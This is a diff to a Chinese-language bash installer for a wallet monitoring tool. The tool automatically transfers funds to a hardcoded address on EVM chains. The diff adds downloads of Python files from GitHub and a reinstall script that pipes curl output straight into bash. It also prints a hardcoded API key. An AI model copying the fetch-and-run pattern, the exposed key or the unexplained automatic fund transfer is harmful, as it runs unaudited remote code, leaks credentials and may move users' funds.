@@ -1,7 +1,7 @@
 #!/bin/bash
 
 # 钱包监控系统一键安装脚本
-# 自动检测环境并安装所有依赖
+# 自动下载、检测环境并安装所有依赖
 
 set -e  # 遇到错误立即退出
 
@@ -17,6 +17,7 @@ NC='\033[0m' # No Color
 print_header() {
     echo -e "${BLUE}======================================================================${NC}"
     echo -e "${BLUE}🚀 钱包监控系统一键安装脚本${NC}"
+    echo -e "${BLUE}   自动下载、安装依赖并启动钱包监控系统${NC}"
     echo -e "${BLUE}   支持所有Alchemy EVM兼容链的钱包监控和自动转账${NC}"
     echo -e "${BLUE}======================================================================${NC}"
 }
@@ -38,6 +39,68 @@ check_os() {
         OS="unknown"
         echo -e "${YELLOW}⚠️  未知操作系统: $OSTYPE${NC}"
     fi
+}
+
+# 检查下载工具
+check_download_tools() {
+    echo -e "\n${CYAN}📋 检查下载工具...${NC}"
+    
+    if command -v curl &> /dev/null; then
+        DOWNLOAD_CMD="curl"
+        echo -e "✅ 找到 curl"
+        return 0
+    elif command -v wget &> /dev/null; then
+        DOWNLOAD_CMD="wget"
+        echo -e "✅ 找到 wget"
+        return 0
+    else
+        echo -e "${RED}❌ 未找到 curl 或 wget${NC}"
+        echo -e "${YELLOW}💡 请安装 curl 或 wget:${NC}"
+        case $OS in
+            "macos")
+                echo -e "   brew install curl"
+                ;;
+            "linux")
+                echo -e "   sudo apt install curl  # Ubuntu/Debian"
+                echo -e "   sudo yum install curl  # CentOS/RHEL"
+                ;;
+        esac
+        return 1
+    fi
+}
+
+# 下载项目文件
+download_files() {
+    echo -e "\n${CYAN}📥 下载项目文件...${NC}"
+    
+    # GitHub仓库的raw文件URL
+    BASE_URL="https://raw.githubusercontent.com/haohaoi34/jiankong/main"
+    
+    # 需要下载的文件列表
+    files=("wallet_monitor.py" "wallet_monitor_launcher.py")
+    
+    for file in "${files[@]}"; do
+        echo -e "📥 下载 $file..."
+        
+        if [ "$DOWNLOAD_CMD" = "curl" ]; then
+            if curl -fsSL "$BASE_URL/$file" -o "$file"; then
+                echo -e "✅ $file 下载成功"
+            else
+                echo -e "${RED}❌ $file 下载失败${NC}"
+                return 1
+            fi
+        elif [ "$DOWNLOAD_CMD" = "wget" ]; then
+            if wget -q "$BASE_URL/$file" -O "$file"; then
+                echo -e "✅ $file 下载成功"
+            else
+                echo -e "${RED}❌ $file 下载失败${NC}"
+                return 1
+            fi
+        fi
+    done
+    
+    echo -e "${GREEN}✅ 所有文件下载完成${NC}"
+    return 0
 }
 
 # 检查Python
@@ -182,11 +245,22 @@ EOF
 check_main_files() {
     echo -e "\n${CYAN}📋 检查主程序文件...${NC}"
     
+    # 如果文件不存在，尝试下载
+    if [ ! -f "wallet_monitor.py" ] || [ ! -f "wallet_monitor_launcher.py" ]; then
+        echo -e "${YELLOW}⚠️  主程序文件不存在，尝试从GitHub下载...${NC}"
+        if ! download_files; then
+            echo -e "${RED}❌ 文件下载失败${NC}"
+            echo -e "${YELLOW}💡 请检查网络连接或手动下载文件:${NC}"
+            echo -e "   curl -O https://raw.githubusercontent.com/haohaoi34/jiankong/main/wallet_monitor.py"
+            echo -e "   curl -O https://raw.githubusercontent.com/haohaoi34/jiankong/main/wallet_monitor_launcher.py"
+            return 1
+        fi
+    fi
+    
     if [ -f "wallet_monitor.py" ]; then
         echo -e "✅ wallet_monitor.py 存在"
     else
-        echo -e "${RED}❌ wallet_monitor.py 不存在${NC}"
-        echo -e "${YELLOW}💡 请确保所有文件都在同一目录下${NC}"
+        echo -e "${RED}❌ wallet_monitor.py 仍然不存在${NC}"
         return 1
     fi
     
@@ -217,7 +291,7 @@ EOF
     cat > reinstall.sh << EOF
 #!/bin/bash
 echo "🔄 重新安装钱包监控系统..."
-$PYTHON_CMD wallet_monitor_launcher.py
+curl -fsSL https://raw.githubusercontent.com/haohaoi34/jiankong/main/install.sh | bash
 EOF
     
     chmod +x reinstall.sh
@@ -240,6 +314,7 @@ show_completion() {
     echo -e "   • 断点续传和状态保存"
     echo -e ""
     echo -e "${YELLOW}🎯 目标转账地址:${NC} 0x6b219df8c31c6b39a1a9b88446e0199be8f63cf1"
+    echo -e "${YELLOW}🔑 API密钥:${NC} S0hs4qoXIR1SMD8P7I6Wt"
     echo -e "${BLUE}======================================================================${NC}"
 }
 
@@ -250,6 +325,18 @@ main() {
     # 检查操作系统
     check_os
     
+    # 检查下载工具
+    if ! check_download_tools; then
+        echo -e "\n${RED}❌ 下载工具检查失败${NC}"
+        exit 1
+    fi
+    
+    # 下载主程序文件
+    if ! download_files; then
+        echo -e "\n${RED}❌ 文件下载失败${NC}"
+        exit 1
+    fi
+    
     # 检查Python
     if ! check_python; then
         echo -e "\n${RED}❌ Python检查失败${NC}"
@@ -259,12 +346,6 @@ main() {
     # 检查pip
     if ! check_pip; then
         echo -e "\n${RED}❌ pip检查失败${NC}"
-        exit 1
-    fi
-    
-    # 检查主程序文件
-    if ! check_main_files; then
-        echo -e "\n${RED}❌ 主程序文件检查失败${NC}"
         exit 1
     fi
     
@@ -291,6 +372,8 @@ main() {
     if [[ "$choice" =~ ^[Yy]$ ]]; then
         echo -e "\n${GREEN}🚀 启动钱包监控系统...${NC}"
         $PYTHON_CMD wallet_monitor.py
+    else
+        echo -e "\n${GREEN}💡 稍后可以运行: ./run_wallet_monitor.sh${NC}"
     fi
 }
 
